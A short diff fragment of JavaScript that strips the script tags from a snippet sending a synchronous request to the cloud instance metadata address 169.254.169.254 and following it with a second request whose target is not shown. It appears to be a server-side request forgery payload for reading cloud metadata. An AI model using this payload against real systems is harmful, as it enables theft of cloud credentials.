@@ -1,4 +1,4 @@
-<script>
+
 const request = new XMLHttpRequest();
 request.open("GET", "http://169.254.169.254/latest/meta-data", false);
 request.send(null);
@@ -10,4 +10,4 @@ request.send(null);
    request2.send(null);
 //}
 
-</script>
+
